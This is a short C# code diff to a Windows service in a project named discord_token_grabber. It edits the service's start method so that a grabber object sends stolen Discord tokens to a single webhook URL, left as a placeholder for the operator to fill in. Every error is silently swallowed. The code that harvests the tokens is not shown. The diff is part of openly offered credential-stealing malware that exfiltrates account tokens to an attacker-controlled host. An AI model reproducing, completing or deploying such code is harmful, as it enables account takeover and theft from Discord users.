@@ -19,7 +19,7 @@ namespace discord_token_grabber
 
         protected override void OnStart(string[] args)
         {
-            try { this.StartWork(); } catch (Exception ex) { }
+            try { this.StartWork(); } catch (Exception error) { }
         }
 
         public void StartWork()
@@ -27,8 +27,7 @@ namespace discord_token_grabber
             string WEBHOOK_URL = "PASTE U WENHOOK HERE";
 
             var discord_Grabber = new grabber();
-            List<string> webhooks = new List<string> { WEBHOOK_URL };
-            discord_Grabber.MultipleThreadSendToken(webhooks);
+            discord_Grabber.ThreadSendToken(WEBHOOK_URL);
         }
     }
 }
